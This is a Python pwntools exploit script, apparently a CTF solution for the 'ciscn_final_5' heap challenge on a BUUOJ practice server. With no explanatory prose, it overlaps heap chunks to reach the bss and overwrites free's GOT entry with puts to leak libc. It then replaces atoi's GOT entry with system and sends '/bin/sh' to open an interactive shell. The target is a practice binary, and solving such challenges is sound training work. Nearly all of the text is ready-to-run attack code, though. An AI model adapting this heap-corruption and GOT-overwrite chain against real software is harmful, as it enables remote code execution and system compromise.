from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-27/ld-2.27.so"
libc_path = "./libc.so.6"
# p = process([ld_path, "./ciscn_final_5"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 28898)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(index, size, con):
    sa("your choice: ", "1")
    sa("index: ", str(index))
    sa("size: ", str(size))
    sa("content: ", con)
    rud("low 12 bits: ")
    info = rud("\n\n")

    return info 

def free(index):
    sa("your choice: ", "2")
    sa("index: ", str(index))

def edit(index, con):
    sa("your choice: ", "3")
    sa("index: ", str(index))
    sa("content: ", con)


# chunk overflow

# alloc to bss
pro = ELF("./ciscn_final_5")
bss = 0x06020E0
free_g = pro.got["free"]
puts_p = pro.plt["puts"]
puts_g = pro.got["puts"]
atoi_g = pro.got["atoi"]

add(0x10, 0x10, p64(0)+p64(0x41))         # 0
add(1, 0x20, "a")                         # 1
free(0)
free(1)

add(0, 0x30, p64(0)+p64(0x31)+p64(bss))   # 0
add(1, 0x20, "a")                         # 1
add(2, 0x20, p64(puts_g)+p64(free_g-0x7)) # 2

# alter free_got to puts_plt --> leak libc
edit(1, cyclic(0x8)+p64(puts_p))
free(0)
info = u64(ru("\x7f")[-6:].ljust(8, b"\x00"))
print("leak: ", hex(info))

# count
libc = ELF(libc_path)
base = info-libc.sym["puts"]
print("base: ", hex(base))
system = base+libc.sym["system"]

# alter atoi_got to system
edit(2, p64(0)+p64(atoi_g-0x7))
edit(1, p64(0)+p64(system))

# attack
sa("your choice: ", "/bin/sh\x00")
shell()


